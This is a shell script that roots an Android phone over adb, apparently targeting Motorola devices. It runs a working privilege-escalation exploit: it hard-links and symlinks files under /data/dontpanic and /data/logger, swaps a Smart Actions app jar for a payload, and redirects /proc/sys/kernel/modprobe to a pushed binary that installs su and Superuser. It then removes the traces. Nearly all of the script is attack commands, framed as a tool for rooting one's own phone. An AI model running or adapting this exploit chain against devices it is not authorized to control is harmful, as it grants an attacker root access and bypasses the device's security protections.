#!/bin/bash

adb kill-server
adb start-server
echo "[*] Before continuing, ensure USB debugging is enabled."
echo "[*]"
echo "[*] Please carefully follow any instructions provided in the exploit."
echo "[*]"
echo "[*] Press enter to root your phone..."
read
echo "[*] Waiting for device..."
adb wait-for-device
echo "[*] Device found."
echo "[*] Phase one..."
adb shell "rm /data/dontpanic/apanic_console 2>/dev/null"
adb shell "ln /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar /data/dontpanic/apanic_console" 
echo "[*] Rebooting device..."
adb reboot
echo "[*] Waiting for phone to reboot."
adb wait-for-device
echo "[*] Phase two..."
adb shell "cat /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar > /data/local/tmp/DataClearJarDex.jar.bak"
echo "[*] Complete the following steps on your device:"
echo "[*] 1. Open the Smart Actions application."
echo "[*] 2. Select "Get Started"."
echo "[*] 3. Select "Battery Saver"."
echo "[*] 4. Select "Save"."
echo "[*] 5. Press the Home button."
echo "[*]"
echo "[*] Press enter here once you have completed the above steps."
read
adb shell "sleep 5"
adb push ./pwn.jar /data/local/tmp/pwn.jar
adb shell "cat /data/local/tmp/pwn.jar > /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar"
echo "[*] Rebooting device..."
adb reboot
echo "[*] Waiting for phone to reboot."
adb wait-for-device
echo "[*] Phase three (this will take a minute)..."
adb shell "sleep 40"
adb shell "mv /data/logger /data/logger.bak"
adb shell "mkdir /data/logger"
adb shell "chmod 777 /data/logger"
adb shell "rm /data/logger/last_apanic_console 2>/dev/null"
adb shell "ln -s /proc/sys/kernel/modprobe /data/logger/last_apanic_console"
adb shell "rm /data/dontpanic/apanic_console 2>/dev/null"
adb shell "echo /data/local/tmp/pwn > /data/dontpanic/apanic_console"
echo "[*] Rebooting device..."
adb reboot
echo "[*] Waiting for phone to reboot."
adb wait-for-device
echo "[*] Phase four..."
adb push ./su /data/local/tmp
adb push ./busybox /data/local/tmp
adb push ./Superuser.apk /data/local/tmp
adb push ./pwn /data/local/tmp
adb shell "chmod 755 /data/local/tmp/pwn"
adb shell "/data/local/tmp/pwn trigger"
echo "[*] Cleaning up..."
adb shell "rm /data/dontpanic/* 2>/dev/null"
adb shell "rm /data/local/tmp/su 2>/dev/null"
adb shell "rm /data/local/tmp/Superuser.apk 2>/dev/null"
adb shell "rm /data/local/tmp/busybox 2>/dev/null"
adb shell "rm /data/local/tmp/pwn 2>/dev/null"
adb shell "su -c 'rm -r /data/logger' 2>/dev/null"
adb shell "su -c 'mv /data/logger.bak /data/logger'"
adb shell "cat /data/local/tmp/DataClearJarDex.jar.bak > /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar"
adb shell "rm /data/local/tmp/pwn.jar 2>/dev/null"
adb shell "rm /data/local/tmp/DataClearJarDex.jar.bak 2>/dev/null"
echo "[*] Rebooting..."
adb reboot
adb wait-for-device
echo "[*] Exploit complete!"
echo "[*] Press any key to exit."
adb kill-server
read
